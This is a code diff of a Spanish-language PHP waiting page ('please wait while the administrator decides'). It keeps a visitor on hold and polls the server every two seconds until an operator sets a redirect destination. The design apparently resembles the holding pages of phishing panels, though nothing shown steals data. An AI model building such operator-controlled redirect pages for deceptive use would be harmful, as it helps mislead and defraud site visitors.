@@ -1,31 +1,31 @@
+&lt;?php
+session_start();
+if (!isset($_SESSION['usuario_id'])) {
+    $_SESSION['usuario_id'] = uniqid();
+}
+$usuario_id = $_SESSION['usuario_id'];
+?&gt;
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;head&gt;
-    &lt;title&gt;Esperando decisión&lt;/title&gt;
+    &lt;title&gt;Espere un momento&lt;/title&gt;
+    &lt;script&gt;
+    function checkRedirect() {
+        fetch('check_destino.php?id=&lt;?php echo $usuario_id; ?&gt;')
+        .then(response =&gt; response.json())
+        .then(data =&gt; {
+            if(data.destino){
+                window.location.href = data.destino;
+            } else {
+                setTimeout(checkRedirect, 2000);
+            }
+        });
+    }
+    window.onload = checkRedirect;
+    &lt;/script&gt;
 &lt;/head&gt;
 &lt;body&gt;
-    <h2>Por favor espere mientras el administrador decide...</h2>
-    &lt;script&gt;
-        let usuarioId = localStorage.getItem('usuarioId');
-        if (!usuarioId) {
-            usuarioId = Math.random().toString(36).substring(2, 12);
-            localStorage.setItem('usuarioId', usuarioId);
-        }
-        fetch('https://lobster-app-2-qn2wf.ondigitalocean.app/api/esperar', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ usuarioId })
-        });
-
-        setInterval(() =&gt; {
-            fetch(`https://lobster-app-2-qn2wf.ondigitalocean.app/api/destino/${usuarioId}`)
-            .then(res =&gt; res.json())
-            .then(data =&gt; {
-                if (data.redirigir) {
-                    window.location.href = data.url;
-                }
-            });
-        }, 2000);
-    &lt;/script&gt;
+    <h2>Por favor espere...</h2>
+    <p>Tu ID: <b>&lt;?php echo $usuario_id; ?&gt;</b></p>
 &lt;/body&gt;
 &lt;/html&gt;
